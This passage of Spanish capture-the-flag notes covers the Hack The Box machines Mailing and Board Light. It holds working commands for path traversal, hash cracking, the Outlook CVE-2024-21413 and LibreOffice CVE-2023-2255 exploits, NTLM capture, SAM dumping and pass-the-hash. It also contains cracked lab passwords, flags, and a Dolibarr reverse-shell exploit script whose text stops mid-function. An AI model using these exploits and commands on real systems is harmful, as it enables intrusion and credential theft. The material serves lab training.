445/tcp open microsoft-ds? syn-ack
587/tcp open smtp syn-ack hMailServer smtpd
993/tcp open ssl/imap syn-ack hMailServer imapd
5040/tcp open unknown syn-ack
5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open pando-pub? syn-ack
47001/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49665/tcp open msrpc syn-ack Microsoft Windows RPC
49666/tcp open msrpc syn-ack Microsoft Windows RPC
49667/tcp open msrpc syn-ack Microsoft Windows RPC
49668/tcp open msrpc syn-ack Microsoft Windows RPC
49669/tcp open msrpc syn-ack Microsoft Windows RPC</cell>
        </row>
      </table>
      <table char_offset="68" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>Service Details:
- SMTP, IMAP, and POP3 services are running on hMailServer.
- HTTP services are hosted on Microsoft IIS.
- RPC and NetBIOS services are exposed.</cell>
        </row>
      </table>
      <node unique_id="15" master_id="0" name="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724971151" ts_lastsave="1724972908">
        <rich_text>web
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

meta data del pdf
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

dorks encontrados
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
resultado
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Vamos a pasar a burp suite a capturar las peticiones y le agregamos al metodo get la siguiente peticion y ejecutamos desde el repeter

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

obtenemos los siguientes resultados

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

datos a destacar

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ataque de descifrado por fuerza bruta
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

resultado
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

CVE encontrado para outlook
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

antes de lanzar el exploit vamos a habilitar la herramienta responder para capturar el mensaje enviado


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

luego mandamos el mensaje con el exploit

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

abrimos wireshark para ver las transferencias  de paquetes y validar el envio

luego revisamos la escucha y recivimos lo siguiente

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ahora pasamos a crakear el mensaje con hashcat

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

resultado

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ejecutamos la herramienta

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

y nos movemos dentro del equipo a desktop

flag
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

nos movemos a la raiz con cd /
y ingresmoa a la siguiente carpeta
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ingresamos a libre ofice y readmes
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ejecutamos lo siguiuente para ver el contenido de los documentos  pero en este caso buscamos este
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vemos que su version es 
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

descargamos el siguiente exploit
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ingresamos a la carpeta y ejecutamos el siguiente comando
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

abrimos un servdiro en nuestra maquina de atacante 
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

en la maquina victima ingresamoa a la siguiente ruta
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

mandamos a llamar el exploit que hemos creado desde la maquina victima

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ya cargado el exploit hacemos ls para validar

luego 

escribimos 
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vemos que somos administradores

luego en nuestra terminal de atacante ejecutamos lo siguiente

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

obtenemo el hash del localadmin

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

y ejecutamos la siguiente herraienta en nuestra maquina

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


con esto hemos logrado nuevamente acceso al sisema pero como root

navegamos hasta la siguiente ruta y hacemos dir para ver lo que tiene dentro
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

flag de root
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <table char_offset="4" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>http://mailing.htb</cell>
          </row>
        </table>
        <table char_offset="25" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>Alonso Fernández</cell>
          </row>
          <row>
            <cell>nombre del creador del pdf</cell>
          </row>
        </table>
        <table char_offset="46" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>Version      : 8.3.3,
Google Dorks: (2)
 Website     : http://www.php.net/</cell>
          </row>
        </table>
        <table char_offset="49" justification="left" col_min="60" col_max="60" col_widths="345">
          <row>
            <cell>dirsearch -u http://mailing.htb/ -x 403,404,400</cell>
          </row>
          <row>
            <cell>herramienta usada</cell>
          </row>
        </table>
        <table char_offset="61" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>[17:08:37] 200 -  541B  - /assets/
[17:08:37] 301 -  160B  - /assets  -&gt;  http://mailing.htb/assets/
[17:08:45] 200 -   31B  - /download.php</cell>
          </row>
        </table>
        <table char_offset="199" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>GET /download.php/?file=../../../Program+Files+(x86)/HMailServer/Bin/HMailServer.INI</cell>
          </row>
        </table>
        <table char_offset="239" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>[Directories]&#13;
ProgramFolder=C:\Program Files (x86)\hMailServer&#13;
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database&#13;
DataFolder=C:\Program Files (x86)\hMailServer\Data&#13;
LogFolder=C:\Program Files (x86)\hMailServer\Logs&#13;
TempFolder=C:\Program Files (x86)\hMailServer\Temp&#13;
EventFolder=C:\Program Files (x86)\hMailServer\Events&#13;
[GUILanguages]&#13;
ValidLanguages=english,swedish&#13;
[Security]&#13;
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7&#13;
[Database]&#13;
Type=MSSQLCE&#13;
Username=&#13;
Password=0a9f8ad8bf896b501dde74f08efd7e4c&#13;
PasswordEncryption=1&#13;
Port=0&#13;
Server=&#13;
Database=hMailServer&#13;
Internal=1</cell>
          </row>
        </table>
        <table char_offset="260" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>Password=0a9f8ad8bf896b501dde74f08efd7e4c</cell>
          </row>
          <row>
            <cell>AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7</cell>
          </row>
        </table>
        <table char_offset="301" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>hashcat -a 0 -m 0 841bb5acfa6779ae432fd7a4e6600ba7 /usr/share/wordlists/rockyou.txt</cell>
          </row>
        </table>
        <table char_offset="314" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>homenetworkingadministrator</cell>
          </row>
        </table>
        <table char_offset="345" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability</cell>
          </row>
        </table>
        <table char_offset="453" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>sudo responder -I tun0 -v</cell>
          </row>
        </table>
        <table char_offset="498" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.66\TEST" --subject XD</cell>
          </row>
        </table>
        <table char_offset="633" justification="left" col_min="60" col_max="60" col_widths="45">
          <row>
            <cell>[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:21f7f581b3036b13:B47F50727D175CC259936DFC53DF0A72:0101000000000000807D9F6DB5EADA01AAA519EFA9E152AF0000000002000800470042005100490001001E00570049004E002D005000570054004D004600430030004E00550043004C0004003400570049004E002D005000570054004D004600430030004E00550043004C002E0047004200510049002E004C004F00430041004C000300140047004200510049002E004C004F00430041004C000500140047004200510049002E004C004F00430041004C0007000800807D9F6DB5EADA01060004000200000008003000300000000000000000000000002000007CDD9ED435C19B0DCD7C9B837767A1D5D95157F06B2C65B3EECBCF2560BBAF400A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00360036000000000000000000</cell>
          </row>
        </table>
        <table char_offset="684" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>hashcat -a 0 -m 5600 maya::MAILING:7ab420949c6a95cc:BBFB34588602E7B609D1DE68AA1C7AC4:0101000000000000807D9F6DB5EADA01F65FB830F6A92F410000000002000800470042005100490001001E00570049004E002D005000570054004D004600430030004E00550043004C0004003400570049004E002D005000570054004D004600430030004E00550043004C002E0047004200510049002E004C004F00430041004C000300140047004200510049002E004C004F00430041004C000500140047004200510049002E004C004F00430041004C0007000800807D9F6DB5EADA01060004000200000008003000300000000000000000000000002000007CDD9ED435C19B0DCD7C9B837767A1D5D95157F06B2C65B3EECBCF2560BBAF400A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00360036000000000000000000 /usr/share/wordlists/rockyou.txt</cell>
          </row>
        </table>
        <table char_offset="698" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>MAYA::MAILING:7ab420949c6a95cc:bbfb34588602e7b609d1de68aa1c7ac4:0101000000000000807d9f6db5eada01f65fb830f6a92f410000000002000800470042005100490001001e00570049004e002d005000570054004d004600430030004e00550043004c0004003400570049004e002d005000570054004d004600430030004e00550043004c002e0047004200510049002e004c004f00430041004c000300140047004200510049002e004c004f00430041004c000500140047004200510049002e004c004f00430041004c0007000800807d9f6db5eada01060004000200000008003000300000000000000000000000002000007cdd9ed435c19b0dcd7c9b837767a1d5d95157f06b2c65b3eecbcf2560bbaf400a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00360036000000000000000000:

resultado: m4y4ngs4ri</cell>
          </row>
        </table>
        <table char_offset="728" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri</cell>
          </row>
        </table>
        <table char_offset="779" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>c7b8dfc4335c6b2b6e6b0651dbcc85b8</cell>
          </row>
        </table>
        <table char_offset="848" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>cd "C:\Program Files"</cell>
          </row>
        </table>
        <table char_offset="886" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>cd C:\Program Files\LibreOffice\readmes&gt;</cell>
          </row>
        </table>
        <table char_offset="987" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>type readme_es.txt</cell>
          </row>
        </table>
        <table char_offset="1015" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>LÃ©ame de LibreOffice 7.4</cell>
          </row>
        </table>
        <table char_offset="1051" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>https://github.com/elweth-sec/CVE-2023-2255</cell>
          </row>
        </table>
        <table char_offset="1112" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
</cell>
          </row>
        </table>
        <table char_offset="1167" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>sudo python3 -m http.server</cell>
          </row>
        </table>
        <table char_offset="1223" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>cd "C:\Important Documents\"</cell>
          </row>
        </table>
        <table char_offset="1298" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>curl -o exploit.odt 10.10.16.66:8000/exploit.odt</cell>
          </row>
        </table>
        <table char_offset="1368" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>net user maya</cell>
          </row>
        </table>
        <table char_offset="1467" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam</cell>
          </row>
        </table>
        <table char_offset="1503" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::</cell>
          </row>
        </table>
        <table char_offset="1563" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"</cell>
          </row>
        </table>
        <table char_offset="1711" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>C:\users\localadmin\Desktop&gt;type root.txt</cell>
          </row>
        </table>
        <table char_offset="1727" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>27b3c34499b9fe8cc9a1036dd5975003</cell>
          </row>
        </table>
      </node>
    </node>
    <node unique_id="11" master_id="0" name="HTB Board Light" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1723136555" ts_lastsave="1724971680">
      <rich_text>Reconocimeinto de puertos

ip= 10.10.11.11


</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <table char_offset="45" justification="left" col_min="60" col_max="60" col_widths="0,0">
        <row>
          <cell>ping -c 1 10.10.11.11</cell>
          <cell>10.10.11.11: icmp_seq=1 ttl=63</cell>
        </row>
      </table>
      <table char_offset="48" justification="left" col_min="60" col_max="60" col_widths="0,420">
        <row>
          <cell>sudo nmap -sS -sV --min-rate 5000 -vvv -n -Pn 10.10.11.11</cell>
          <cell>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41

Service Info: Host: board.htb 
OS: Linux; CPE: cpe:/o:linux:linux_kernel</cell>
        </row>
      </table>
      <node unique_id="12" master_id="0" name="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1723136567" ts_lastsave="1723136601">
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


| whoami = larissa |

</rich_text>
        <table char_offset="1" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>sudo dirb http://board.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</cell>
            <cell>sin exito
</cell>
          </row>
        </table>
        <table char_offset="3" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>ffuf -u http://board.htb -c -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt  -H "HOST:FUZZ.board.htb" -fw 6243</cell>
            <cell>crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 102ms]</cell>
          </row>
        </table>
        <table char_offset="5" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>subdominio encontrado</cell>
            <cell>http://crm.board.htb/</cell>
          </row>
        </table>
        <table char_offset="8" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>admin</cell>
            <cell>admin</cell>
          </row>
          <row>
            <cell>user</cell>
            <cell>password</cell>
          </row>
        </table>
        <table char_offset="11" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py</cell>
          </row>
        </table>
        <table char_offset="13" justification="left" col_min="60" col_max="60" col_widths="705,1020">
          <row>
            <cell>➜  python3 exploit.py -h
usage: python3 exploit.py &lt;TARGET_HOSTNAME&gt; &lt;USERNAME&gt; &lt;PASSWORD&gt; &lt;LHOST&gt; &lt;LPORT&gt;
example: python3 exploit.py http://example.com login password 127.0.0.1 9001
---[Reverse Shell Exploit for Dolibarr &lt;= 17.0.0 (CVE-2023-30253)]---

positional arguments:
  hostname    Target hostname
  username    Username of Dolibarr ERP/CRM
  password    Password of Dolibarr ERP/CRM
  lhost       Listening host for reverse shell
  lport       Listening port for reverse shell

options:
  -h, --help  show this help message and exit
  
  
  --------------------------------------------------------------------
  
  exploit aplicado:
  
  python3 exploit.py http://crm.board.htb admin admin 10.10.16.66 9001
  
  -------------------------------------------------------------------
  
  puerto en escuhca
  
  sudo nc -lvnp 9001
  -----------------------------------------------------------------
  
  export TERM=xterm
  
  -------------------------------
  
  buscamos el home
  
  -----------------------------
  
  </cell>
            <cell>#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import http.client
import time
import argparse
import uuid

auth_headers = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
    "Connection": "close"
}

def remove_http_prefix(url: str) -&gt; str:
    if url.startswith("http://"):
        return url[len("http://"):]
    elif url.startswith("https://"):
        return url[len("https://"):]
    else:
        return url

def get_csrf_token(url, headers):
    csrf_token = ""
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")
        meta_tag = soup.find("meta", attrs={"name": "anti-csrf-newtoken"})

        if meta_tag:
            csrf_token = meta_tag.get("content")
        else:
            print("[!] CSRF token not found")
    else:
        print("[!] Failed to retrieve the page. Status code:", response.status_code)

    return csrf_token

def auth(pre_login_token, username, password, auth_url, auth_headers):
    login_payload = {
        "token": pre_login_token,
        "actionlogin": "login",
        "loginfunction": "loginfunction",
        "backtopage": "",
        "tz": "-5",
        "tz_string": "America/New_York",
        "dst_observed": "1",
        "dst_first": "2024-03-10T01:59:00Z",
        "dst_second": "2024-11-3T01:59:00Z",
        "screenwidth": "1050",
        "screenheight": "965",
        "dol_hide_topmenu": "",
        "dol_hide_leftmenu": "",
        "dol_optimize_smallscreen": "",
        "dol_no_mouse_hover": "",
        "dol_use_jmobile": "",
        "username": username,
        "password": password
    }

    requests.post(auth_url, data=login_payload, headers=auth_headers, allow_redirects=True)
    
def create_site(hostname, login_token, site_name, http_connection):
    create_site_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryKouJvCUT1lX8IVE6",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    create_site_body = (
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "addsite\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n"
        "-1\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_REF\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_LANG\"\r\n\r\n"
        "en\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_OTHERLANG\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_DESCRIPTION\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"virtualhost\"\r\n\r\n"
        "http://" + site_name + ".localhost\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"addcontainer\"\r\n\r\n"
        "Create\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6--\r\n"
    )

    http_connection.request("POST", "/website/index.php", create_site_body, create_site_headers)
    http_connection.getresponse()

def create_page(hostname, login_token, site_name, http_connection):
    create_page_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryur7X26L0cMS2mE5w",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    create_page_body = (
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "addcontainer\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"pageidbis\"\r\n\r\n"
        "-1\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"pageid\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"radiocreatefrom\"\r\n\r\n"
        "checkboxcreatemanually\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_TYPE_CONTAINER\"\r\n\r\n"
        "page\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"sample\"\r\n\r\n"
        "empty\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_TITLE\"\r\n\r\n"
        "TEST\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_PAGENAME\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_ALIASALT\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_DESCRIPTION\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_IMAGE\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_KEYWORDS\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_LANG\"\r\n\r\n"
        "0\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_AUTHORALIAS\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreation\"\r\n\r\n"
        "05/25/2024\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationday\"\r\n\r\n"
        "25\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationmonth\"\r\n\r\n"
        "05\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationyear\"\r\n\r\n"
        "2024\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationhour\"\r\n\r\n"
        "15\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationmin\"\r\n\r\n"
        "25\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationsec\"\r\n\r\n"
        "29\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader_x\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader_y\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"addcontainer\"\r\n\r\n"
        "Create\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"externalurl\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"grabimages\"\r\n\r\n"
        "1\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"grabimagesinto\"\r\n\r\n"
        "root\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w--\r\n"
    )

    http_connection.request("POST", "/website/index.php", create_page_body, create_page_headers)
    http_connection.getresponse()

def edit_page(hostname, login_token, site_name, lhost, lport, http_connection):
    edit_page_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryYWePyybXc70N8CPm",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    edit_page_body = (
